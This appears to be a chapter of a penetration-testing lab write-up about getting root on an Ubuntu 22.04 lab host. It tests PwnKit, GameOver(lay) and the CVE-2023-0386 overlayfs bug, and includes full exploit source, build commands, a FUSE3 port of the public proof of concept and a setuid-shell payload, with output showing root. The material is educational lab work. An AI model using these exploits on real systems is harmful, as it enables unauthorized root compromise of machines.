# 06 — Privilege escalation

Goal: root from `stuart`, on a host whose only real weakness is a GA kernel from October 2022.

This chapter is mostly about *refuting* things. Two of the three obvious kernel escalations fail, and
the third only works after the public proof of concept is ported to a library the target actually
ships.

---

## 6.1 Candidate 1 — PwnKit (CVE-2021-4034)

Everything looks right: `policykit-1 0.105-33` (the GA package), `pkexec` setuid root, and a public
exploit that needs nothing but a compiled binary and a directory name.

The bug: `pkexec`'s `main()` iterates `for (n = 1; n < argc; n++)` and then dereferences `argv[1]`.
When the caller passes an empty `argv` (`argc == 0`), `argv[1]` walks off the end of the argv vector
and lands on `envp[0]`. `pkexec` then treats `envp[0]` as the program path — and because it is still
a genuine environment variable, `GCONV_PATH=.` makes glibc load `./gconv-modules` and
`./pwnkit.so` when `pkexec` formats its error message. The module runs as root, before
authentication.

Build it:

```bash
cat > pwnkit.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void *step)
{
    setuid(0); setgid(0); setreuid(0,0); setregid(0,0);
    execl("/bin/sh", "sh", "-c",
          "/bin/cp /bin/bash /tmp/.rb161 && /bin/chmod 4755 /tmp/.rb161", NULL);
    _exit(0);
}
EOF

echo 'module UTF-8// PWNKIT// pwnkit 1' > gconv-modules
mkdir -p 'GCONV_PATH=.'
cp /usr/bin/true 'GCONV_PATH=./pwnkit.so:'
gcc --shared -fPIC -o pwnkit.so pwnkit.c
gcc -o cve-2021-4034 cve-2021-4034.c      # argv={NULL}, envp[0]="GCONV_PATH=."
```

Run it:

```bash
cd /tmp/pk161 && ./cve-2021-4034; echo "exit=$?"
```

```
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
```

`GLib: Cannot convert message` is glibc saying *I tried to convert and could not find the
converter*. Not "I refused to look". So the question becomes: is the layout wrong, or is the
environment sanitised?

Two tests separate those.

**Test A — does `GCONV_PATH` survive into `pkexec` at all?**

```bash
cd /tmp/pk161
GCONV_PATH=. CHARSET=PWNKIT /usr/bin/pkexec --help
```

```
GLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”
```

Same message. The variable is being ignored in both cases.

**Test B — is the payload correct?** Run the identical gconv directory against a **non-setuid copy**
of the same binary, where `AT_SECURE` is not set and nothing is stripped:

```bash
cp /usr/bin/pkexec /tmp/pk161/pkexec_copy && chmod 755 /tmp/pk161/pkexec_copy
sed 's|/usr/bin/pkexec|/tmp/pk161/pkexec_copy|' cve-2021-4034.c > pk2.c
gcc -o pk2 pk2.c
./pk2
ls -la /tmp/.rb161
```

```
-rwsr-xr-x 1 stuart stuart 1396520 /tmp/.rb161
```

It works. Against a non-setuid binary, the module loads and the payload runs. So the `GCONV_PATH=.`
layout, the `gconv-modules` name, the module path and the exported `gconv_init` are all correct.

That leaves exactly one explanation for the setuid case: the real `pkexec` is not vulnerable. Two
independent reasons are visible in its output:

- **`AT_SECURE` strips `GCONV_PATH`.** For a setuid binary the loader scrubs `LD_*`, and glibc
  ignores `GCONV_PATH` when `__libc_enable_secure` is set. The module can never be reached.
- **The usage text is the patched handler.** The vulnerable build falls through to
  `g_printerr(_("Error …"))`. The build here prints the full `--version | --help | …` usage block,
  which is what upstream's fix added for the `argc < 1` case.

Recorded as refuted, with a positive control (Test B) proving the exploit was built correctly.
Without Test B, "it didn't work" would have been an untested claim, and the next hour would have
been spent rebuilding the wrong thing.

Clean up the artefact from Test B before moving on:

```bash
rm -f /tmp/.rb161
```

---

## 6.2 Candidate 2 — GameOver(lay) (CVE-2023-2640 / CVE-2023-0386's Ubuntu sibling)

The Ubuntu-specific bug: in a user namespace, `setcap` on a file is allowed to write a capability
xattr that the kernel later honours *outside* the namespace. The published chain is a shell script:

```bash
setcap cap_setuid+eip ./python3          # inside unshare -rm
mount -t overlay overlay -o rw,lowerdir=…,upperdir=…,workdir=… ./m
touch ./m/x                              # force copy-up of the capability file
./m/python3 -c 'import os; os.setuid(0); print(os.geteuid())'
```

Run it here:

```bash
rm -rf /tmp/g; mkdir -p /tmp/g/{l,u,w,m}
cp /usr/bin/python3 /tmp/g/l/python3
unshare -rm sh -c '
  setcap cap_setuid+eip /tmp/g/l/python3 &&
  mount -t overlay overlay -o rw,lowerdir=/tmp/g/l,upperdir=/tmp/g/u,workdir=/tmp/g/w /tmp/g/m &&
  touch /tmp/g/m/python3'
```

Copy-up succeeds, and the capability is on the real filesystem:

```
-rwxr-xr-x 1 stuart stuart 5912936 /tmp/g/u/python3
/tmp/g/u/python3 cap_setuid=eip
```

So far, exactly as the exploit expects. Now execute it:

```bash
/tmp/g/u/python3 -c 'import os; os.setuid(0); print("euid=", os.geteuid())'
```

```
Traceback (most recent call last):
  File "<string>", line 1, in <module>
PermissionError: [Errno 1] Operation not permitted
```

The capability is present, the file is on ext4 (`/`, `rw,relatime` — not `nosuid`), and `setuid` is
still denied. That means the kernel is **not honouring** the xattr. The reason is inside it:

```bash
python3 -c "import os; d=os.getxattr('/tmp/g/u/python3','security.capability'); \
print('rev:', int.from_bytes(d[0:4],'little'), 'rootid:', int.from_bytes(d[4:8],'little'))"
```

```
rev: 50331649 rootid: 128
```

`50331649` is `0x03000001` — **VFS_CAP_REVISION_3**. The capability xattr has a third field,
`rootid`, and here it is `128`, a real value rather than `0`.

That single value defeats the attack. Under a network-namespace `setcap`, a kernel without the
Ubuntu patch writes revision 2 (no `rootid`), and the capability is honoured for real uid 0.
A kernel with the fix records the namespace root's kuid in `rootid`, and the check at exec time
refuses to grant the capability outside that namespace. `rootid: 128` is the kernel saying "this
capability belongs to a namespace, not to you".

Recorded as refuted, with the exact xattr as the evidence.

---

## 6.3 Candidate 3 — overlayfs copy-up (CVE-2023-0386)

The bug: when overlayfs copies a file **up** from the lower layer into the upper layer, it preserves
the file's ownership and mode — including `setuid` and file capabilities — without validating that
the lower layer's metadata is legitimate. A user-controlled lower layer can therefore state "this
file is owned by uid 0 and is mode 04777", and the copy-up materialises that as a real root-owned
SUID file in a directory the attacker owns.

Requirements:

1. Unprivileged user namespaces — `kernel.unprivileged_userns_clone = 1`, `max_user_namespaces =
   15252`. Present.
2. The ability to mount overlayfs inside a user namespace — works, as §6.2 already demonstrated.
3. A lower layer that can *lie* about `st_uid` and `st_mode`. That is exactly what FUSE is for: a
   userspace filesystem can report any metadata it likes for a file it serves.

The kernel here is `5.15.0-53-generic`; the fix landed in `5.15.0-70`. So this should work.

### The problem: no FUSE2

The published PoC (`xkaneiki/CVE-2023-0386`) builds three things:

```make
gcc fuse.c     -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
gcc            -o exp exp.c
gcc            -o gc getshell.c
```

`fuse.c` is libfuse **2**. The target has:

```
/lib/x86_64-linux-gnu/libfuse3.so.3 -> libfuse3.so.3.10.5
fuse3 3.10.5-1build1
```

FUSE3 only — no `libfuse.so.2`, no `fuse 2.x` headers, and no compiler. The PoC does not build, and
the target cannot build it anyway.

So port the helper. It only has to do four things: report a root-owned `04777` file for one path,
serve its bytes, and mount.

```c
/* fuse3mnt.c — minimal FUSE3 lower layer for CVE-2023-0386 */
#define FUSE_USE_VERSION 31
#define _GNU_SOURCE
#include <fuse3/fuse.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static char *content;
static size_t clen;

static int cb_getattr(const char *path, struct stat *st, struct fuse_file_info *fi)
{
    (void)fi;
    memset(st, 0, sizeof(*st));
    if (strcmp(path, "/") == 0) {
        st->st_mode = S_IFDIR | 0777;
        st->st_nlink = 2; st->st_uid = 1000; st->st_gid = 1000;
        return 0;
    }
    if (strcmp(path, "/file") == 0) {
        st->st_mode  = S_IFREG | 04777;   /* the lie: setuid root */
        st->st_nlink = 1;
        st->st_uid   = 0;
        st->st_gid   = 0;
        st->st_size  = (off_t)clen;
        return 0;
    }
    return -ENOENT;
}

static int cb_readdir(const char *p, void *buf, fuse_fill_dir_t filler,
                      off_t o, struct fuse_file_info *fi, enum fuse_readdir_flags f)
{
    (void)p; (void)o; (void)fi; (void)f;
    filler(buf, ".", NULL, 0, 0);
    filler(buf, "..", NULL, 0, 0);
    filler(buf, "file", NULL, 0, 0);
    return 0;
}

static int cb_open(const char *path, struct fuse_file_info *fi)
{ (void)fi; return strcmp(path, "/file") ? -ENOENT : 0; }

static int cb_read(const char *path, char *buf, size_t size, off_t off,
                   struct fuse_file_info *fi)
{
    (void)fi;
    if (strcmp(path, "/file")) return -ENOENT;
    if ((size_t)off >= clen) return 0;
    if ((size_t)off + size > clen) size = clen - (size_t)off;
    memcpy(buf, content + off, size);
    return (int)size;
}

static struct fuse_operations ops = {
    .getattr = cb_getattr, .readdir = cb_readdir,
    .open    = cb_open,    .read    = cb_read,
};

int main(int argc, char **argv)
{
    char *fargv[2] = { (char *)"fuse3mnt", NULL };
    struct fuse_args args = FUSE_ARGS_INIT(1, fargv);
    struct fuse *f;
    int fd;

    if (argc < 3) { fprintf(stderr, "usage: %s <mnt> <file>\n", argv[0]); return 1; }

    fd = open(argv[2], O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }
    content = malloc(1 << 20);
    clen = 0;
    while (read(fd, content + clen, 1) > 0 && clen < (1 << 20)) clen++;
    close(fd);

    f = fuse_new(&args, &ops, sizeof(ops), NULL);
    if (!f) { fprintf(stderr, "fuse_new failed\n"); return 1; }
    if (fuse_mount(f, argv[1]) != 0) { fprintf(stderr, "fuse_mount failed\n"); return 1; }
    fuse_loop(f);
    return 0;
}
```

`fuse_new` needs a non-empty `argv` — `FUSE_ARGS_INIT(0, NULL)` fails with
`fuse: empty argv passed to fuse_session_new()`, which is worth knowing because every FUSE3
low-level example online passes `&argc, &argv` from `main` and never mentions it.

### Building it for the wrong glibc

Dev headers are not installed and `apt` needs root, so pull the package without installing it:

```bash
apt-get download libfuse3-dev
mkdir -p /tmp/fuse3dev && dpkg -x libfuse3-dev_*.deb /tmp/fuse3dev
```

First attempt, dynamic:

```bash
gcc fuse3mnt.c -o fuse3mnt -D_FILE_OFFSET_BITS=64 \
    -I/tmp/fuse3dev/usr/include -L/tmp/fuse3dev/usr/lib/x86_64-linux-gnu -lfuse3
```

It runs on the attacker box and dies on the target:

```
./fuse3mnt: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found
```

Kali is on glibc 2.38; Ubuntu 22.04 is on 2.35. Link statically:

```bash
gcc -static -O2 -o fuse3mnt fuse3mnt.c -D_FILE_OFFSET_BITS=64 \
    -I/tmp/fuse3dev/usr/include \
    -L/tmp/fuse3dev/usr/lib/x86_64-linux-gnu -lfuse3 -lpthread -ldl
```

```
fuse3mnt: ELF 64-bit LSB executable, x86-64, statically linked
```

Building the exploit target (`exp.c`) needs no libcap — the only `cap_*` block is an unused
`listCaps()` debug helper, so delete it and it compiles with plain `gcc -o exp exp.c`.

### Running it

The payload (`gc`) is a tiny setuid-0 program that drops a verifiable root artefact:

```c
int main(void) {
    setuid(0); setgid(0); setreuid(0,0); setregid(0,0);
    system("/bin/cp /bin/bash /tmp/.rb161 && /bin/chmod 4755 /tmp/.rb161");
    return 0;
}
```

Mount the lying filesystem, then run `exp`:

```bash
mkdir -p /tmp/ovl/ovlcap/lower && cd /tmp/ovl
(setsid ./fuse3mnt ./ovlcap/lower ./gc > f.log 2>&1 &)
sleep 3
cat f.log
ls -la ovlcap/lower/
./exp
```

```
[+] serving 16168 bytes as /file (04777 root)
[+] mounted at ./ovlcap/lower

drwxrwxrwx 2 stuart stuart     0 Jan  1  1970 .
-rwsrwxrwx 1 root   root   16168 Jan  1  1970 file

total 8
drwxr-xr-x 1 root   root   4096 .          <- the merged view
drwxr-xr-x 6 root   root   4096 ..
-rwsrwxrwx 1 nobody nogroup 16168 Jan  1  1970 file
uid:1000 gid:1000
[+] mount success
[+] exploit success!
```

The `nobody:nogroup` in the merged listing is the *namespace's* view of the file — inside the user
namespace, uid 0 is mapped to `stuart`, so the kernel displays it as the overflow uid. That is the
tell that the file has crossed the boundary: after copy-up, on the real filesystem, it is owned by
the real root.

```bash
ls -la /tmp/.rb161
```

```
-rwsr-xr-x 1 root root 1396520 /tmp/.rb161
```

Real `root:root`, real `4755`. Run it:

```bash
/tmp/.rb161 -p -c 'id; hostname'
```

```
uid=1000(stuart) gid=1000(stuart) euid=0(root) groups=1000(stuart),4(adm),24(cdrom),30(dip),46(plugdev)
lab-pwk2-student-cl4-144-ubuntu2204-crystal-240-111
```

`euid=0(root)`. Root.

---

## 6.4 Why this one worked

| Candidate | Version signal | Actual verdict | Evidence |
|---|---|---|---|
| PwnKit | `policykit-1 0.105-33` — GA build | **refuted** | same payload succeeds on non-setuid copy, fails on the setuid binary → `AT_SECURE` + patched `argc` handler |
| GameOver(lay) | kernel `5.15.0-53` | **refuted** | cap xattr written `VFS_CAP_REVISION_3` with `rootid=128` → `setuid` returns `EPERM` |
| CVE-2023-0386 | kernel `5.15.0-53` (< `-70`) | **confirmed** | copy-up of a FUSE-reported `04777` uid-0 file produced `-rwsr-xr-x root root` on ext4 |

The pattern worth taking away: **a version string is a hypothesis, and each hypothesis needs a test
that can fail.** Test B in §6.1 is the model — run the same payload somewhere it *should* work, so
that a failure on the real target distinguishes "my tooling is wrong" from "the target is patched".
Without that control, PwnKit would have looked like a skill problem and consumed the rest of the
session.
